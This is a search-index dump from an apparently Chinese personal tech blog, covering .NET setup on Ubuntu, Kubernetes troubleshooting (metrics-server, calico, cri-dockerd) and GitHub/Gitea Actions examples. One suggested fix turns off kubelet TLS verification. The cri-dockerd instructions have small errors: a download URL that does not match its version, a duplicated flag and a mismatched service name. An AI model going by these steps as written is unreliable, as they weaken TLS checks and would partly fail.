","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:5:0","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#参考文档"},{"categories":["blog"],"content":"[[笔记/point/csharp|csharp]] 的安装和排错.","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/","series":null,"tags":["blog","csharp"],"title":"csharp安装","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/"},{"categories":["blog"],"content":" 简介csharp 的安装和排错. ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp安装","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/#简介"},{"categories":["blog"],"content":" 安装.NET 和 Ubuntu 概述 - .NET | Microsoft Learn 通常 ubuntu 22.04 以及以上版本自带. # 搜索 apt search dotnet # 安装这个整合包即可 apt install dotnet7 ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp安装","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/#安装"},{"categories":["blog"],"content":" 排错如果使用过程中出现无法找到 sdk, runtimes, libhostfxr 相关的信息, 是因为你混用了 微软官方 和 Ubuntu官方 包. # 卸载 apt remove 'dotnet*' 'aspnet*' 'netstandard*' # 移除微软残酷 rm -f /etc/apt/sources.list.d/microsoft-prod.list apt update -y # 重新安装 apt install dotnet7 可以参考官方文档 排查 Linux 上的 .NET 包混杂问题 - .NET | Microsoft Learn ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/:3:0","series":null,"tags":["blog","csharp"],"title":"csharp安装","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E5%AE%89%E8%A3%85/#排错"},{"categories":["blog"],"content":"这里记录处理 [[笔记/point/k8s|k8s]] 的常见问题.","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/"},{"categories":["blog"],"content":" 简介这里记录处理 k8s 的常见问题. ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:1:0","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#简介"},{"categories":["blog"],"content":" 排错路线 ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:2:0","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#排错路线"},{"categories":["blog"],"content":" 错误合集","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:0","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#错误合集"},{"categories":["blog"],"content":" metrics-server doesn’t contain any IP SANs在 metrics-server 启动的 yml 文件中, 添加启动参数 command: - /metrics-server - --kubelet-insecure-tls kubectl top pod 报错 error: Metrics API not available当你使用 kubectl top pod 来查看信息的时候, 需要安装 Metrics-server, 参考链接 下载下来 curl https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml -o metrics-server.yaml 因为多数都是自签名证书, 所以添加启动参数 --kubelet-insecure-tls ... apiVersion: apps/v1 kind: Deployment metadata: labels: k8s-app: metrics-server name: metrics-server namespace: kube-system spec: selector: matchLabels: k8s-app: metrics-server strategy: rollingUpdate: maxUnavailable: 0 template: metadata: labels: k8s-app: metrics-server spec: containers: - args: - --cert-dir=/tmp - --secure-port=4443 - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname - --kubelet-use-node-status-port - --metric-resolution=15s - --kubelet-insecure-tls # 添加此行 ... ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:1","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#metrics-server"},{"categories":["blog"],"content":" metrics-server doesn’t contain any IP SANs在 metrics-server 启动的 yml 文件中, 添加启动参数 command: - /metrics-server - --kubelet-insecure-tls kubectl top pod 报错 error: Metrics API not available当你使用 kubectl top pod 来查看信息的时候, 需要安装 Metrics-server, 参考链接 下载下来 curl https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml -o metrics-server.yaml 因为多数都是自签名证书, 所以添加启动参数 --kubelet-insecure-tls ... apiVersion: apps/v1 kind: Deployment metadata: labels: k8s-app: metrics-server name: metrics-server namespace: kube-system spec: selector: matchLabels: k8s-app: metrics-server strategy: rollingUpdate: maxUnavailable: 0 template: metadata: labels: k8s-app: metrics-server spec: containers: - args: - --cert-dir=/tmp - --secure-port=4443 - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname - --kubelet-use-node-status-port - --metric-resolution=15s - --kubelet-insecure-tls # 添加此行 ... ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:1","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#doesnt-contain-any-ip-sans"},{"categories":["blog"],"content":" metrics-server doesn’t contain any IP SANs在 metrics-server 启动的 yml 文件中, 添加启动参数 command: - /metrics-server - --kubelet-insecure-tls kubectl top pod 报错 error: Metrics API not available当你使用 kubectl top pod 来查看信息的时候, 需要安装 Metrics-server, 参考链接 下载下来 curl https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml -o metrics-server.yaml 因为多数都是自签名证书, 所以添加启动参数 --kubelet-insecure-tls ... apiVersion: apps/v1 kind: Deployment metadata: labels: k8s-app: metrics-server name: metrics-server namespace: kube-system spec: selector: matchLabels: k8s-app: metrics-server strategy: rollingUpdate: maxUnavailable: 0 template: metadata: labels: k8s-app: metrics-server spec: containers: - args: - --cert-dir=/tmp - --secure-port=4443 - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname - --kubelet-use-node-status-port - --metric-resolution=15s - --kubelet-insecure-tls # 添加此行 ... ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:1","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#kubectl-top-pod-报错-error-metrics-api-not-available"},{"categories":["blog"],"content":" too many pods 容器启动失败发现 kubesphere 的 cicd 容器无法启动, 于是排查容器 kubectl describe pod/cicdrfbh9-pay-h5-35-gn0rf-pl1sr-g8tpr -n kubesphere-devops-worker 提示 too many pods, 下面是操作方法. 完整顺序应该是 先排水 不可调度 改配置, 重启 重新调度 Kubelet 的启动配置通常是这样, 我们加上 --max-pods=300 然后重启 kubelet 服务即可. Environment=\"KUBELET_EXTRA_ARGS=--node-ip=10.30.1.127 --hostname-override=node1 --max-pods=300\" ExecStart=/usr/local/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:2","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#too-many-pods-容器启动失败"},{"categories":["blog"],"content":" 清理残存的容器笔记/k8s常用命令和配置#清理残存容器 ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:3","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#清理残存的容器"},{"categories":["blog"],"content":" 证书 # 查找证书 find / -name apiserver.crt /etc/kubernetes/pki/apiserver.crt # 查看证书过期时间 openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -dates notBefore=Apr 22 06:54:59 2022 GMT notAfter=Apr 1 19:00:00 2024 GMT # kuadm查看证书状态 kubeadm certs check-expiration ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:4","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#证书"},{"categories":["blog"],"content":" 网络插件错误 Multus网络插件的报错, 会出现如下的关键字: network: Multus … KillPodSandbox… Unauthorized… networkPlugin cni failed 我们在安装网络插件的时候, 只不过是通过 kubectl create/edit 操作了一些资源, 所以我们重启等操作不会造成其他的影响. 在官方也有不少这样的骚操作, 比如 这个帖子的答案推荐直接尝试重启 …. 操作流程 # 查找插件calico,flannal之类的 kubectl get all -A |grep cali # 杀死重启 kubectl delete pod/calico-node-xxx -n 命名空间 kubectl delete pod/kube-multus-ds-xxx -n 命名空间 BGP网络插件的报错类似于 calico/node is not ready: BIRD is not ready:BGP not established with 192.168.200.129,192.168.200.130 Number of node(s)with BGP peering established =0 calico 通常会根据第一个网卡来配置信息. 而出现上面的报错, 就说明我们没有找到正确的网卡, 没有配置正确的 ip 信息. 解决: ip a 查看我们需要用到的网卡名称. 例如 eth0, ens33 等等 修改 vim calico.yaml # 增加内容 - name: IP_AUTODETECTION_METHOD value: \"interface=en*\" # 也可以写死 \"interface=eth0\" # 下面是原文件内容 - name: CLUSTER_TYPE value: \"k8s,bgp\" - name: IP value: \"autodetect\" - name: CALICO_IPV4POOL_IPIP value: \"Always\" 重新部署 kubectl apply -f calico.yaml ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:5","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#网络插件错误"},{"categories":["blog"],"content":" 网络插件错误 Multus网络插件的报错, 会出现如下的关键字: network: Multus … KillPodSandbox… Unauthorized… networkPlugin cni failed 我们在安装网络插件的时候, 只不过是通过 kubectl create/edit 操作了一些资源, 所以我们重启等操作不会造成其他的影响. 在官方也有不少这样的骚操作, 比如 这个帖子的答案推荐直接尝试重启 …. 操作流程 # 查找插件calico,flannal之类的 kubectl get all -A |grep cali # 杀死重启 kubectl delete pod/calico-node-xxx -n 命名空间 kubectl delete pod/kube-multus-ds-xxx -n 命名空间 BGP网络插件的报错类似于 calico/node is not ready: BIRD is not ready:BGP not established with 192.168.200.129,192.168.200.130 Number of node(s)with BGP peering established =0 calico 通常会根据第一个网卡来配置信息. 而出现上面的报错, 就说明我们没有找到正确的网卡, 没有配置正确的 ip 信息. 解决: ip a 查看我们需要用到的网卡名称. 例如 eth0, ens33 等等 修改 vim calico.yaml # 增加内容 - name: IP_AUTODETECTION_METHOD value: \"interface=en*\" # 也可以写死 \"interface=eth0\" # 下面是原文件内容 - name: CLUSTER_TYPE value: \"k8s,bgp\" - name: IP value: \"autodetect\" - name: CALICO_IPV4POOL_IPIP value: \"Always\" 重新部署 kubectl apply -f calico.yaml ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:5","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#multus"},{"categories":["blog"],"content":" 网络插件错误 Multus网络插件的报错, 会出现如下的关键字: network: Multus … KillPodSandbox… Unauthorized… networkPlugin cni failed 我们在安装网络插件的时候, 只不过是通过 kubectl create/edit 操作了一些资源, 所以我们重启等操作不会造成其他的影响. 在官方也有不少这样的骚操作, 比如 这个帖子的答案推荐直接尝试重启 …. 操作流程 # 查找插件calico,flannal之类的 kubectl get all -A |grep cali # 杀死重启 kubectl delete pod/calico-node-xxx -n 命名空间 kubectl delete pod/kube-multus-ds-xxx -n 命名空间 BGP网络插件的报错类似于 calico/node is not ready: BIRD is not ready:BGP not established with 192.168.200.129,192.168.200.130 Number of node(s)with BGP peering established =0 calico 通常会根据第一个网卡来配置信息. 而出现上面的报错, 就说明我们没有找到正确的网卡, 没有配置正确的 ip 信息. 解决: ip a 查看我们需要用到的网卡名称. 例如 eth0, ens33 等等 修改 vim calico.yaml # 增加内容 - name: IP_AUTODETECTION_METHOD value: \"interface=en*\" # 也可以写死 \"interface=eth0\" # 下面是原文件内容 - name: CLUSTER_TYPE value: \"k8s,bgp\" - name: IP value: \"autodetect\" - name: CALICO_IPV4POOL_IPIP value: \"Always\" 重新部署 kubectl apply -f calico.yaml ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:5","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#bgp"},{"categories":["blog"],"content":" cri-dockerd validate CRI v 1 runtime API for endpoint情景： kubeadm init 或 crictl ps 的时候报错： validate CRI v1 runtime API for endpoint \"unix:///var/run/cri-dockerd.sock\" 解答： 网上很多的教程都有一定的滞后性。如果无法保证所有组件的版本，架构一致，可能会出现问题。包括但不限于：k8s 版本，cni 版本，docker 版本，containerd 版本，arm 架构， x 86 架构等等。 cri-dockerd 是为了不停兼容 cri 标准。所以 cri-dockerd 和 k8s 的版本兼容性比较好。而 dockerd 的内部 api 可能会经常变动，比如下图 cri-dockerd 的 v0.3.8 开始兼容 docker 的 v24.0.7 版本 处理: 建议下载最新的 cri-dockerd 版本，配置 cri-dockerd： # 获取软件 mkdir /data/softs \u0026\u0026 cd /data/softs wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.2.1/cri-dockerd-0.3.8.amd64.tgz # 解压软件 tar xf cri-dockerd-0.3.8.amd64.tgz mv cri-dockerd/cri-dockerd /usr/local/bin/ # 检查效果 cri-dockerd --version # 守护进程 vim /etc/systemd/system/cri-dockerd.service [Unit] Description=CRI Interface for Docker Application Container Engine Documentation=https://docs.mirantis.com After=network-online.target firewalld.service docker.service Wants=network-online.target [Service] Type=notify ExecStart=/usr/local/bin/cri-dockerd --network-plugin=cni --cni-conf-dir=/etc/cni/net.d --cni-bin-dir=/opt/cni/bin --container-runtime-endpoint=unix:///var/run/cri-dockerd.sock --image-pull-progress-deadline=30s --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.6 --cri-dockerd-root-directory=/var/lib/dockershim --docker-endpoint=unix:///var/run/docker.sock --cri-dockerd-root-directory=/var/lib/docker ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always StartLimitBurst=3 StartLimitInterval=60s LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process [Install] WantedBy=multi-user.target vim /usr/lib/systemd/system/cri-dockerd.socket [Unit] Description=CRI Docker Socket for the API PartOf=cri-docker.service [Socket] ListenStream=/var/run/cri-dockerd.sock SocketMode=0660 SocketUser=root SocketGroup=docker [Install] WantedBy=sockets.target # 启动服务 systemctl daemon-reload systemctl enable cri-dockerd.service systemctl restart cri-dockerd.service # 检测效果 crictl --runtime-endpoint /var/run/cri-dockerd.sock ps vim /etc/containerd/config.toml 去除 disabled_plugins = [\"cri\"]. 重启 Containerd systemctl restart containerd 测试是否可以通过 cri-dockerd 联通 docker # cat /etc/crictl.yaml runtime-endpoint: \"unix:///var/run/cri-dockerd.sock\" image-endpoint: \"unix:///var/run/cri-dockerd.sock\" timeout: 10 debug: false pull-image-on-create: true disable-pull-on-run: false # 测试效果 crictl ps kubeadm 无法指定 –cri-socket准备一个配置文件 kube-init.yaml apiVersion: kubeadm.k8s.io/v1beta3 kind: InitConfiguration nodeRegistration: criSocket: unix:///var/run/cri-dockerd.sock 引入配置文件即可： kubeadm init phase upload-certs --upload-certs --config kube-init.yml ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:6","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#cri-dockerd"},{"categories":["blog"],"content":" cri-dockerd validate CRI v 1 runtime API for endpoint情景： kubeadm init 或 crictl ps 的时候报错： validate CRI v1 runtime API for endpoint \"unix:///var/run/cri-dockerd.sock\" 解答： 网上很多的教程都有一定的滞后性。如果无法保证所有组件的版本，架构一致，可能会出现问题。包括但不限于：k8s 版本，cni 版本，docker 版本，containerd 版本，arm 架构， x 86 架构等等。 cri-dockerd 是为了不停兼容 cri 标准。所以 cri-dockerd 和 k8s 的版本兼容性比较好。而 dockerd 的内部 api 可能会经常变动，比如下图 cri-dockerd 的 v0.3.8 开始兼容 docker 的 v24.0.7 版本 处理: 建议下载最新的 cri-dockerd 版本，配置 cri-dockerd： # 获取软件 mkdir /data/softs \u0026\u0026 cd /data/softs wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.2.1/cri-dockerd-0.3.8.amd64.tgz # 解压软件 tar xf cri-dockerd-0.3.8.amd64.tgz mv cri-dockerd/cri-dockerd /usr/local/bin/ # 检查效果 cri-dockerd --version # 守护进程 vim /etc/systemd/system/cri-dockerd.service [Unit] Description=CRI Interface for Docker Application Container Engine Documentation=https://docs.mirantis.com After=network-online.target firewalld.service docker.service Wants=network-online.target [Service] Type=notify ExecStart=/usr/local/bin/cri-dockerd --network-plugin=cni --cni-conf-dir=/etc/cni/net.d --cni-bin-dir=/opt/cni/bin --container-runtime-endpoint=unix:///var/run/cri-dockerd.sock --image-pull-progress-deadline=30s --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.6 --cri-dockerd-root-directory=/var/lib/dockershim --docker-endpoint=unix:///var/run/docker.sock --cri-dockerd-root-directory=/var/lib/docker ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always StartLimitBurst=3 StartLimitInterval=60s LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process [Install] WantedBy=multi-user.target vim /usr/lib/systemd/system/cri-dockerd.socket [Unit] Description=CRI Docker Socket for the API PartOf=cri-docker.service [Socket] ListenStream=/var/run/cri-dockerd.sock SocketMode=0660 SocketUser=root SocketGroup=docker [Install] WantedBy=sockets.target # 启动服务 systemctl daemon-reload systemctl enable cri-dockerd.service systemctl restart cri-dockerd.service # 检测效果 crictl --runtime-endpoint /var/run/cri-dockerd.sock ps vim /etc/containerd/config.toml 去除 disabled_plugins = [\"cri\"]. 重启 Containerd systemctl restart containerd 测试是否可以通过 cri-dockerd 联通 docker # cat /etc/crictl.yaml runtime-endpoint: \"unix:///var/run/cri-dockerd.sock\" image-endpoint: \"unix:///var/run/cri-dockerd.sock\" timeout: 10 debug: false pull-image-on-create: true disable-pull-on-run: false # 测试效果 crictl ps kubeadm 无法指定 –cri-socket准备一个配置文件 kube-init.yaml apiVersion: kubeadm.k8s.io/v1beta3 kind: InitConfiguration nodeRegistration: criSocket: unix:///var/run/cri-dockerd.sock 引入配置文件即可： kubeadm init phase upload-certs --upload-certs --config kube-init.yml ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:6","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#validate-cri-v-1-runtime-api-for-endpoint"},{"categories":["blog"],"content":" cri-dockerd validate CRI v 1 runtime API for endpoint情景： kubeadm init 或 crictl ps 的时候报错： validate CRI v1 runtime API for endpoint \"unix:///var/run/cri-dockerd.sock\" 解答： 网上很多的教程都有一定的滞后性。如果无法保证所有组件的版本，架构一致，可能会出现问题。包括但不限于：k8s 版本，cni 版本，docker 版本，containerd 版本，arm 架构， x 86 架构等等。 cri-dockerd 是为了不停兼容 cri 标准。所以 cri-dockerd 和 k8s 的版本兼容性比较好。而 dockerd 的内部 api 可能会经常变动，比如下图 cri-dockerd 的 v0.3.8 开始兼容 docker 的 v24.0.7 版本 处理: 建议下载最新的 cri-dockerd 版本，配置 cri-dockerd： # 获取软件 mkdir /data/softs \u0026\u0026 cd /data/softs wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.2.1/cri-dockerd-0.3.8.amd64.tgz # 解压软件 tar xf cri-dockerd-0.3.8.amd64.tgz mv cri-dockerd/cri-dockerd /usr/local/bin/ # 检查效果 cri-dockerd --version # 守护进程 vim /etc/systemd/system/cri-dockerd.service [Unit] Description=CRI Interface for Docker Application Container Engine Documentation=https://docs.mirantis.com After=network-online.target firewalld.service docker.service Wants=network-online.target [Service] Type=notify ExecStart=/usr/local/bin/cri-dockerd --network-plugin=cni --cni-conf-dir=/etc/cni/net.d --cni-bin-dir=/opt/cni/bin --container-runtime-endpoint=unix:///var/run/cri-dockerd.sock --image-pull-progress-deadline=30s --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.6 --cri-dockerd-root-directory=/var/lib/dockershim --docker-endpoint=unix:///var/run/docker.sock --cri-dockerd-root-directory=/var/lib/docker ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always StartLimitBurst=3 StartLimitInterval=60s LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process [Install] WantedBy=multi-user.target vim /usr/lib/systemd/system/cri-dockerd.socket [Unit] Description=CRI Docker Socket for the API PartOf=cri-docker.service [Socket] ListenStream=/var/run/cri-dockerd.sock SocketMode=0660 SocketUser=root SocketGroup=docker [Install] WantedBy=sockets.target # 启动服务 systemctl daemon-reload systemctl enable cri-dockerd.service systemctl restart cri-dockerd.service # 检测效果 crictl --runtime-endpoint /var/run/cri-dockerd.sock ps vim /etc/containerd/config.toml 去除 disabled_plugins = [\"cri\"]. 重启 Containerd systemctl restart containerd 测试是否可以通过 cri-dockerd 联通 docker # cat /etc/crictl.yaml runtime-endpoint: \"unix:///var/run/cri-dockerd.sock\" image-endpoint: \"unix:///var/run/cri-dockerd.sock\" timeout: 10 debug: false pull-image-on-create: true disable-pull-on-run: false # 测试效果 crictl ps kubeadm 无法指定 –cri-socket准备一个配置文件 kube-init.yaml apiVersion: kubeadm.k8s.io/v1beta3 kind: InitConfiguration nodeRegistration: criSocket: unix:///var/run/cri-dockerd.sock 引入配置文件即可： kubeadm init phase upload-certs --upload-certs --config kube-init.yml ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/:3:6","series":null,"tags":["blog","k8s"],"title":"k8s的疑难杂症","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/#kubeadm-无法指定---cri-socket"},{"categories":["point"],"content":"kubesphere 是一个 k8s 工具, 帮助你搭建和展示. 要点: 开源 免费 ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/kubesphere/:0:0","series":null,"tags":["point","kubesphere"],"title":"kubesphere","uri":"/posts/%E7%AC%94%E8%AE%B0/point/kubesphere/#"},{"categories":["point"],"content":" CICDjenkins 的工作命名空间是 kubesphere-devops-worker ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/kubesphere/:0:1","series":null,"tags":["point","kubesphere"],"title":"kubesphere","uri":"/posts/%E7%AC%94%E8%AE%B0/point/kubesphere/#cicd"},{"categories":["point"],"content":"ubuntu 是一个基于 linux 的操作系统. 要点: 用户量大 生态很强 商业支持 ","date":"2023-07-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/ubuntu/:0:0","series":null,"tags":["point","ubuntu"],"title":"ubuntu","uri":"/posts/%E7%AC%94%E8%AE%B0/point/ubuntu/#"},{"categories":["journal"],"content":"2023-07-27 日记","date":"2023-07-27","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-27/","series":null,"tags":["journal"],"title":"2023-07-27","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-27/"},{"categories":["journal"],"content":"NIST 是美国国家标准技术研究院, 不推荐定期改密码. NIST SP 800-63 Digital Identity Guidelines-FAQ #fun/文章 ","date":"2023-07-27","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-27/:0:0","series":null,"tags":["journal"],"title":"2023-07-27","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-27/#"},{"categories":["point"],"content":"jenkins 是一个非常流行的 CICD 工具 要点: 开源 免费 用户量大 ","date":"2023-07-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/jenkins/:0:0","series":null,"tags":["point","jenkins"],"title":"jenkins","uri":"/posts/%E7%AC%94%E8%AE%B0/point/jenkins/#"},{"categories":["blog"],"content":" 简介github 的 CICD 工具名字叫 action,而 gitea 采用了兼容的方式. 因为 github 肯定会经常用到, 而以后私人也可以使用 gitea, 所以记录一下使用方法. 代码放在这里, 可以 fork 练习一下. GitHub - kentxxq/learn-actions ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:1:0","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#简介"},{"categories":["blog"],"content":" 功能示例","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:0","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#功能示例"},{"categories":["blog"],"content":" 触发事件 name: Actions Demo run-name: ken is testing out Actions 🚀 on: # gitea无法手动触发 # workflow_dispatch: # 可以为空 push: # 这样也可以 push: tags: - '**' paths: - '**.js' - '!xxx/***' # 忽略路径 branches: - main - 'releases/**' ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:1","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#触发事件"},{"categories":["blog"],"content":" 缓存 name: cache on: push: workflow_dispatch: jobs: a: runs-on: ubuntu-latest steps: - name: cache 1.txt id: cache1 uses: actions/cache@v3 with: path: 1.txt key: 1.txt - name: build 1.txt if: steps.cache1.outputs.cache-hit != 'true' run: | touch 1.txt echo 1 \u003e 1.txt echo 1.txt创建完成 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:2","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#缓存"},{"categories":["blog"],"content":" Docker 构建 Gitea 版本 name: docker on: push: workflow_dispatch: jobs: test-docker: runs-on: ubuntu-latest container: catthehacker/ubuntu:act-latest steps: - name: check docker version run: | docker version Github 版本Build and push Docker images · Actions · GitHub Marketplace · GitHub jobs: docker: runs-on: ubuntu-latest steps: - name: Set up Docker Buildx uses: docker/setup-buildx-action@v2 - name: check docker version run: | docker version - name: Login to Docker Hub uses: docker/login-action@v2 with: username: ${{ secrets.DOCKERHUB_USERNAME }} password: ${{ secrets.DOCKERHUB_TOKEN }} - name: Build and push uses: 